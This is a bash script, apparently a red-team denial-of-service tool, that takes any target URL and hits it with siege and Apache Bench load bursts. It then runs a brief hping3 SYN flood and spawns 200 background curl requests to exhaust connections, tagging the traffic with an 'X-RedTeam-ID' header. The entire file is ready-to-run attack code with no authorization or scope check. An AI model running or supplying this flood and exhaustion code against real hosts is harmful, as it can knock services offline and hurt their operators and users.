#!/bin/bash
# Stress test a target URL using siege + ab + connection exhaustion
set -euo pipefail

TARGET="${1:?Usage: stress_test.sh <target-url>}"
DURATION="${2:-30}"
CONCURRENCY="${3:-50}"
OUTDIR="${4:-/home/attacker/results/stress}"
ATTEMPT_ID="${5:-stress-$(date +%s)}"

mkdir -p "$OUTDIR"

echo "[*] Starting stress test on $TARGET (${DURATION}s, ${CONCURRENCY} concurrent)"
echo "[*] Attempt ID: $ATTEMPT_ID"

# ---- Siege load test ----
echo "[+] Running siege..."
siege -c "$CONCURRENCY" -t "${DURATION}s" -b "$TARGET" \
    -H "X-RedTeam-ID: $ATTEMPT_ID" \
    --log="$OUTDIR/siege.log" 2>"$OUTDIR/siege_result.txt" || true

# ---- Apache Bench burst ----
echo "[+] Running ab (Apache Bench)..."
TOTAL_REQUESTS=$((CONCURRENCY * DURATION))
ab -n "$TOTAL_REQUESTS" -c "$CONCURRENCY" \
    -H "X-RedTeam-ID: $ATTEMPT_ID" \
    "$TARGET/" > "$OUTDIR/ab_result.txt" 2>&1 || true

# ---- Slowloris simulation via hping3 (SYN flood, brief) ----
HOST=$(echo "$TARGET" | sed -E 's|https?://||' | cut -d: -f1 | cut -d/ -f1)
PORT=$(echo "$TARGET" | grep -oP ':\K[0-9]+' || echo "80")
echo "[+] Brief SYN flood simulation (5s)..."
timeout 5 hping3 -S --flood -p "$PORT" "$HOST" > "$OUTDIR/hping3.txt" 2>&1 || true

# ---- Connection exhaustion test ----
echo "[+] Connection exhaustion test..."
for i in $(seq 1 200); do
    (curl -sk -H "X-RedTeam-ID: $ATTEMPT_ID" "$TARGET/" &>/dev/null &)
done
sleep 3
echo "[+] Spawned 200 concurrent connections"

echo "[*] Stress test complete."
echo "=== SIEGE RESULTS ==="
cat "$OUTDIR/siege_result.txt" 2>/dev/null || echo "n/a"
echo ""
echo "=== AB RESULTS ==="
grep -E "(Requests per second|Time per request|Failed|Total)" "$OUTDIR/ab_result.txt" 2>/dev/null || echo "n/a"
